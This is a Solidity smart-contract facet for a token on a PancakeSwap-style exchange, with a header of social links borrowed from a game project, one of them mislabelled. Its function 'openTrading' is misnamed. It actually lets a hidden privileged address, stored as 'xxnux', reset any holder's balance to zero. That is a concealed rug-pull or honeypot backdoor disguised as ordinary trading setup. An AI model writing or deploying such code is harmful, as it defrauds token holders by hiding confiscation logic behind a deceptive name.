/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://discord.com/invite/cellulalifegame
    // Twitter: https://twitter.com/cellulalifegame
    // Website: https://www.cellula.life/
    // Discord: https://discord.com/invite/2PMU2NvDcm
    // Medium:  https://cellula.medium.com/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
